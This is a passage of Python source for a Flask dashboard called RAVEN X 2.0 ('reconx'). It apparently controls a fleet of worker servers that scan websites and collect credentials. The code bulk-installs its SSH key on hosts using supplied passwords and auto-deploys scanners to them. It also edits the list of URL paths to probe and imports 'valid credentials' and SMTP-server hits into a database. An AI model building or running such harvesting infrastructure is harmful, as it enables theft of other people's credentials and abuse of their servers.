            with open(cfg_path, 'r') as f:
                cfg = json.load(f)
            kp = cfg.get('ssh_key_path')
            if kp:
                candidates.append(kp + '.pub')
    except Exception:
        pass
    candidates.append(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   '..', '.ssh', 'id_ed25519.pub'))
    candidates.append(os.path.expanduser('~/.ssh/id_ed25519.pub'))

    for p in candidates:
        try:
            if p and os.path.exists(p):
                with open(p, 'r') as f:
                    pub = f.read().strip()
                if pub:
                    return pub
        except Exception:
            continue
    raise FileNotFoundError(
        'controller public key not found; checked: ' + ', '.join(candidates))


@app.route('/api/fleet/auto-deploy-config', methods=['GET', 'POST'])
def api_fleet_auto_deploy_config():
    """Toggle Effect C's auto-deploy-on-key-install behaviour. GET returns
    the current fleet config block (default {auto_deploy: True}); POST
    accepts {auto_deploy: bool} and persists it into config.json."""
    if request.method == 'POST':
        data = request.get_json(force=True, silent=True) or {}
        _set_fleet_config({'auto_deploy': bool(data.get('auto_deploy', True))})
    return jsonify(_get_fleet_config())


@app.route('/api/fleet/worker/<ip>/label', methods=['POST'])
def api_fleet_worker_label(ip):
    """Update the friendly label for a worker."""
    if not re.match(r'^[0-9a-zA-Z.\-:]{3,64}$', ip):
        return jsonify({'error': 'invalid ip'}), 400
    data = request.get_json(force=True, silent=True) or {}
    label = str(data.get('label', '')).strip()[:80]   # cap length
    with _FLEET_CREDS_WRITE_LOCK:
        creds = _load_fleet_creds()
        if ip not in creds:
            return jsonify({'error': 'ip not in fleet_creds'}), 404
        creds[ip]['label'] = label
        _save_fleet_creds(creds)
    return jsonify({'ok': True, 'label': label})


@app.route('/api/fleet/worker/<ip>/role', methods=['POST'])
def api_fleet_worker_role(ip):
    """Set the worker's role. 'scanner' or 'warc'."""
    if not re.match(r'^[0-9a-zA-Z.\-:]{3,64}$', ip):
        return jsonify({'error': 'invalid ip'}), 400
    data = request.get_json(force=True, silent=True) or {}
    role = str(data.get('role', 'scanner')).strip()
    if role not in ('scanner', 'warc'):
        return jsonify({'error': "role must be 'scanner' or 'warc'"}), 400
    with _FLEET_CREDS_WRITE_LOCK:
        creds = _load_fleet_creds()
        if ip not in creds:
            return jsonify({'error': 'ip not in fleet_creds'}), 404
        creds[ip]['role'] = role
        _save_fleet_creds(creds)
    return jsonify({'ok': True, 'role': role})


@app.route('/api/fleet/install-keys', methods=['POST'])
def api_fleet_install_keys():
    """For each row that authenticates with a password, append the controller's
    public key to the worker's `~user/.ssh/authorized_keys`. After this, the
    controller can SSH into the worker with key auth (the mode fleet_api and
    ssh_manager use by default).

    Body: same shapes as /api/fleet/bulk-creds — form-file 'file', JSON
    {"text": "..."}, or JSON {"creds": [...]}. Rows without a password are
    skipped (no-op for already-key-authed hosts).
    """
    try:
        import paramiko
    except ImportError:
        return jsonify({'error': 'paramiko not installed'}), 500

    try:
        pubkey = _resolve_controller_pubkey()
    except FileNotFoundError as e:
        return jsonify({'error': str(e)}), 500

    body_text = ''
    rows = []
    if 'file' in request.files:
        body_text = request.files['file'].read().decode('utf-8', errors='ignore')
    elif request.is_json:
        data = request.json or {}
        if isinstance(data.get('text'), str):
            body_text = data['text']
        elif isinstance(data.get('creds'), list):
            for c in data['creds']:
                if not isinstance(c, dict) or not c.get('host'):
                    continue
                rows.append({
                    'host': str(c.get('host')),
                    'port': int(c.get('port') or 22),
                    'user': str(c.get('user') or 'root'),
                    'auth_kind': str(c.get('auth_kind') or 'password'),
                    'secret': str(c.get('secret') or ''),
                    'raw': str(c.get('host')),
                })
        else:
            return jsonify({'error': 'send "text" or "creds"'}), 400
    else:
        body_text = request.get_data(as_text=True) or ''

    if body_text:
        rows = _parse_creds_text(body_text)
    if not rows:
        return jsonify({'error': 'no credential rows parsed'}), 400

    # Shell that appends the pubkey idempotently. The single quotes around
    # $KEY in the heredoc-style here-string would break if the key itself
    # contained a single quote, so we pass it as stdin and use grep -F.
    install_cmd = (
        'umask 077 && '
        'mkdir -p "$HOME/.ssh" && chmod 700 "$HOME/.ssh" && '
        'touch "$HOME/.ssh/authorized_keys" && chmod 600 "$HOME/.ssh/authorized_keys" && '
        'KEY=$(cat) && '
        'grep -qxF "$KEY" "$HOME/.ssh/authorized_keys" || echo "$KEY" >> "$HOME/.ssh/authorized_keys"'
    )

    results = []
    installed = 0
    for r in rows:
        out = {'host': r['host'], 'port': r['port'], 'user': r['user'],
               'ok': False, 'installed': False, 'message': ''}
        if r['auth_kind'] != 'password' or not r['secret']:
            out['message'] = 'skipped — not a password row'
            results.append(out)
            continue
        tcp_ok, tcp_err = _tcp_reachable(r['host'], r['port'], timeout=2.5)
        if not tcp_ok:
            out['message'] = tcp_err
            results.append(out)
            continue
        try:
            cli = paramiko.SSHClient()
            cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            cli.connect(hostname=r['host'], port=r['port'], username=r['user'],
                        password=r['secret'], timeout=8, allow_agent=False,
                        look_for_keys=False)
            try:
                stdin, stdout, stderr = cli.exec_command(install_cmd, timeout=10)
                stdin.write(pubkey + '\n')
                stdin.channel.shutdown_write()
                exit_status = stdout.channel.recv_exit_status()
                err = stderr.read().decode('utf-8', errors='replace').strip()
                if exit_status == 0:
                    out['ok'] = True
                    out['installed'] = True
                    out['message'] = 'controller key installed'
                    installed += 1
                    # Now that the controller's pubkey is in this user's
                    # authorized_keys, ssh_manager should connect as them
                    # with key auth — not as root.
                    _remember_worker(r['host'], r['port'], r['user'], 'key')
                    # Effect C: fire-and-forget scanner deploy so the operator
                    # only has to drop creds + targets — no second click.
                    if _get_fleet_config().get('auto_deploy', True):
                        threading.Thread(
                            target=_auto_deploy_one,
                            args=(r['host'],),
                            daemon=True,
                        ).start()
                else:
                    out['message'] = f'install failed (exit {exit_status}): {err or "no stderr"}'
            finally:
                cli.close()
        except Exception as e:
            out['message'] = f'connect failed: {e}'
        results.append(out)

    return jsonify({
        'total': len(rows),
        'installed': installed,
        'skipped': sum(1 for r in results if not r['installed'] and r['message'].startswith('skipped')),
        'failed': sum(1 for r in results if not r['ok'] and not r['message'].startswith('skipped')),
        'results': results,
    })



# ==================== SCANNER PATH FILE ====================

SCANNER_PATHS_FILE = 'paths.txt'


@app.route('/api/scanner-paths', methods=['GET', 'POST', 'DELETE'])
def api_scanner_paths():
    """Read, replace, or clear paths.txt — the override list consumed by main.go's loadEnvPaths().
    When paths.txt is absent main.go falls back to its built-in ~70 default paths."""
    if request.method == 'GET':
        if not os.path.exists(SCANNER_PATHS_FILE):
            return jsonify({'present': False, 'lines': 0, 'source': 'builtin'})
        with open(SCANNER_PATHS_FILE, 'r') as f:
            lines = [ln.rstrip('\n') for ln in f if ln.strip() and not ln.lstrip().startswith('#')]
        return jsonify({'present': True, 'lines': len(lines), 'source': 'paths.txt'})

    if request.method == 'DELETE':
        if os.path.exists(SCANNER_PATHS_FILE):
            os.remove(SCANNER_PATHS_FILE)
        return jsonify({'present': False, 'lines': 0, 'source': 'builtin'})

    # POST: multipart file upload OR raw text body.
    if 'file' in request.files:
        body = request.files['file'].read().decode('utf-8', errors='ignore')
    else:
        body = request.get_data(as_text=True) or ''

    lines = []
    for ln in body.splitlines():
        s = ln.strip()
        if not s or s.startswith('#'):
            continue
        if not s.startswith('/'):
            s = '/' + s
        lines.append(s)
    if not lines:
        return jsonify({'error': 'No valid path lines (each must be a URL path).'}), 400

    with open(SCANNER_PATHS_FILE, 'w') as f:
        for ln in lines:
            f.write(ln + '\n')
    return jsonify({'present': True, 'lines': len(lines), 'source': 'paths.txt'})


@app.route('/api/update', methods=['GET', 'POST'])
def api_update():
    """Trigger a self-update: git pull + re-run installer via the sudoers-allowlisted helper.
    The dashboard banner posts here; the helper runs detached so the request returns immediately."""
    import shutil
    helper = '/usr/local/bin/reconx-update'

    if request.method == 'GET':
        return jsonify({'available': os.path.exists(helper), 'helper': helper})

    if not os.path.exists(helper):
        return jsonify({
            'started': False,
            'error': 'Update helper not installed. Re-run installer/deploy.py on the controller.',
        }), 503

    sudo = shutil.which('sudo') or '/usr/bin/sudo'
    try:
        subprocess.Popen(
            [sudo, '-n', helper],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True,
        )
    except Exception as e:
        return jsonify({'started': False, 'error': str(e)}), 500

    return jsonify({
        'started': True,
        'message': 'Update started. Services will restart in 30–90s.',
    })


# ==================== SSH KEY MANAGEMENT ====================

SSH_KEY_PATH = '/opt/reconx/.ssh/id_ed25519'   # match what install-controller.sh writes
SSH_PUB_PATH = SSH_KEY_PATH + '.pub'


def _ssh_key_fingerprint(pubkey: str) -> str:
    """SHA256:... format matching `ssh-keygen -lf -` output."""
    try:
        parts = pubkey.strip().split()
        if len(parts) < 2:
            return ''
        raw = base64.b64decode(parts[1])
        digest = hashlib.sha256(raw).digest()
        return 'SHA256:' + base64.b64encode(digest).rstrip(b'=').decode('ascii')
    except Exception:
        return ''


@app.route('/api/ssh-key', methods=['GET'])
def api_ssh_key_get():
    """Return the controller's public key, fingerprint, and creation timestamp."""
    if not os.path.exists(SSH_PUB_PATH):
        return jsonify({'exists': False, 'pubkey': '', 'fingerprint': '', 'created_at': None})
    try:
        with open(SSH_PUB_PATH, 'r') as f:
            pubkey = f.read().strip()
        try:
            mtime = os.path.getmtime(SSH_PUB_PATH)
            created_at = datetime.fromtimestamp(mtime).isoformat()
        except Exception:
            created_at = None
        return jsonify({
            'exists': True,
            'pubkey': pubkey,
            'fingerprint': _ssh_key_fingerprint(pubkey),
            'created_at': created_at,
        })
    except Exception:
        return jsonify({'exists': False, 'error': 'failed to read pubkey'}), 500


@app.route('/api/ssh-key/regenerate', methods=['POST'])
def api_ssh_key_regenerate():
    """Replace the controller's keypair. Caller is warned in the UI that
    every worker must be re-imported afterwards."""
    try:
        os.makedirs(os.path.dirname(SSH_KEY_PATH), exist_ok=True)
        # Remove existing key files so ssh-keygen doesn't prompt.
        for p in (SSH_KEY_PATH, SSH_PUB_PATH):
            if os.path.exists(p):
                os.remove(p)
        subprocess.check_call([
            'ssh-keygen', '-t', 'ed25519', '-N', '',
            '-f', SSH_KEY_PATH,
            '-C', 'reconx-controller@regenerated',
        ], timeout=15)
        os.chmod(SSH_KEY_PATH, 0o600)
        os.chmod(SSH_PUB_PATH, 0o644)
        with open(SSH_PUB_PATH, 'r') as f:
            pubkey = f.read().strip()
        return jsonify({
            'ok': True,
            'pubkey': pubkey,
            'fingerprint': _ssh_key_fingerprint(pubkey),
            'message': 'Keypair regenerated. Re-run Import to fleet on every worker so the new key gets installed in authorized_keys.',
        })
    except subprocess.CalledProcessError as e:
        return jsonify({'ok': False, 'error': f'ssh-keygen failed (exit {e.returncode})'}), 500
    except Exception:
        return jsonify({'ok': False, 'error': 'regenerate failed'}), 500


# ==================== LOGS ====================

@app.route('/api/logs/controller', methods=['GET'])
def api_logs_controller():
    """Return the last N lines of the dashboard service's journal."""
    n = max(10, min(500, int(request.args.get('n', 200))))
    try:
        out = subprocess.check_output(
            ['journalctl', '-u', 'reconx-dashboard', '-n', str(n), '--no-pager', '-o', 'short-iso'],
            text=True, timeout=8,
        )
        return jsonify({'lines': out.splitlines()})
    except FileNotFoundError:
        return jsonify({'error': 'journalctl not available', 'lines': []}), 503
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'journalctl timed out', 'lines': []}), 504
    except Exception:
        return jsonify({'error': 'controller log unavailable', 'lines': []}), 500


@app.route('/api/logs/worker/<ip>', methods=['GET'])
def api_logs_worker(ip):
    """Tail /root/python_job/output.log on a worker via SSH."""
    # Validate ip so the URL path can't sneak into shell argv
    if not re.match(r'^[0-9a-zA-Z.\-:]{3,64}$', ip):
        return jsonify({'error': 'invalid ip'}), 400
    n = max(10, min(500, int(request.args.get('n', 200))))
    mgr = get_ssh_manager()
    if not mgr:
        return jsonify({'error': 'SSH not available'}), 503
    work_dir = mgr.config.get('work_dir', '/root/python_job')
    out = mgr.ssh_exec(ip, f"tail -n {n} {work_dir}/output.log 2>/dev/null || echo '(no output.log yet)'", 10)
    return jsonify({'ip': ip, 'lines': (out or '').splitlines()})


@app.route('/api/logs/workers', methods=['GET'])
def api_logs_workers_list():
    """List of IPs the operator can request worker logs for."""
    mgr = get_ssh_manager()
    if not mgr:
        return jsonify({'ips': []})
    return jsonify({'ips': mgr.load_servers()})


# ==================== WEBSOCKET HANDLERS ====================

@socketio.on('connect')
def handle_connect():
    print('🔌 Client connected')
    emit('stats_update', get_statistics())

@socketio.on('disconnect')
def handle_disconnect():
    print('🔌 Client disconnected')

@socketio.on('request_update')
def handle_request_update():
    import_from_files()
    emit('stats_update', get_statistics())

@socketio.on('clear_results')
def handle_clear_results():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM credentials')
        cursor.execute('UPDATE statistics SET total_urls_scanned=0, total_hits_found=0, total_credentials_valid=0, smtp_servers_found=0 WHERE id=1')
        conn.commit()
        conn.close()
        
        if os.path.exists(RESULTS_DIR):
            for filename in os.listdir(RESULTS_DIR):
                filepath = os.path.join(RESULTS_DIR, filename)
                if os.path.isfile(filepath):
                    try:
                        os.remove(filepath)
                    except:
                        pass
        
        global file_mtimes, scan_start_time
        file_mtimes.clear()
        scan_start_time = time.time()
        
        socketio.emit('stats_update', get_statistics())
        emit('clear_complete', {'success': True})
    except Exception as e:
        emit('clear_complete', {'success': False, 'message': str(e)})

# VPS WebSocket handlers
@socketio.on('vps_request_status')
def handle_vps_request_status():
    """Request VPS status update"""
    manager = get_ssh_manager()
    if manager:
        servers = manager.get_all_status()
        stats = manager.get_global_stats()
        emit('vps_update', {'type': 'status_update', 'servers': servers, 'stats': stats})

@socketio.on('vps_start_monitoring')
def handle_vps_start_monitoring():
    """Start VPS monitoring"""
    manager = get_ssh_manager()
    if manager:
        # Don't force a 5s probe interval here — let SSHManager pick from
        # ssh_config.json's monitor_interval (defaults to 30s) so we don't
        # hammer workers with reconnect/probe storms.
        manager.start_monitoring(vps_status_callback)
        emit('vps_monitoring_started', {'success': True})

@socketio.on('vps_stop_monitoring')
def handle_vps_stop_monitoring():
    """Stop VPS monitoring"""
    manager = get_ssh_manager()
    if manager:
        manager.stop_monitoring()
        emit('vps_monitoring_stopped', {'success': True})

# ==================== STARTUP ====================
# Run at module-load time so gunicorn workers (which import app:app, never hit __main__) initialize the DB.
init_db()

# Kick the SSH monitor at boot. Previously this only started when the
# frontend emitted `vps_start_monitoring` over socket.io, so a worker
# that boots while no dashboard tab is open (or before the socket
# connects) would stay in self.servers = {} forever. get_cached_status
# returns UNKNOWN for every IP in that state, which mapStatus on the
# frontend falls through to 'reconnecting' — that's the RECONNECT pill.
# Starting here means the cache is warm well before the first /api/vps/status
# request lands.
try:
    if SSH_AVAILABLE:
        _mgr = get_ssh_manager()
        if _mgr:
            # Inject the R2 health probe before the monitor thread
            # starts so the cache is hot by the first probe cycle.
            try:
                _mgr.set_r2_health_probe(_r2_health_probe)
            except Exception as _e2:
                print(f"[startup] could not register R2 health probe: {_e2}")
            _mgr.start_monitoring(vps_status_callback)
except Exception as _e:
    print(f"[startup] could not start SSH monitoring: {_e}")

# ==================== MAIN ====================

if __name__ == '__main__':
    print("=" * 70)
    print("🚀 RAVEN X 2.0 - UNIFIED DASHBOARD")
    print("=" * 70)
    print(f"📊 Dashboard: http://0.0.0.0:5000")
    print(f"🖥️  VPS Panel: http://0.0.0.0:5000/vps")
    print(f"🗄️  Database: {DB_PATH}")
    print(f"📁 Local Results: {RESULTS_DIR}")
    print(f"🔐 SSH Available: {SSH_AVAILABLE}")
    print("=" * 70)
    
    print(f"📥 Importing existing results...")
    imported_valid, imported_hits = import_from_files()
    print(f"✅ Imported {imported_valid} valid credentials")
    
    # Start local file monitor
    monitor_thread = threading.Thread(target=background_file_monitor, daemon=True)
    monitor_thread.start()
    print("👀 Local file monitor started")
    
    print("=" * 70)
    print("✨ Dashboard ready!")
    print("=" * 70)
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
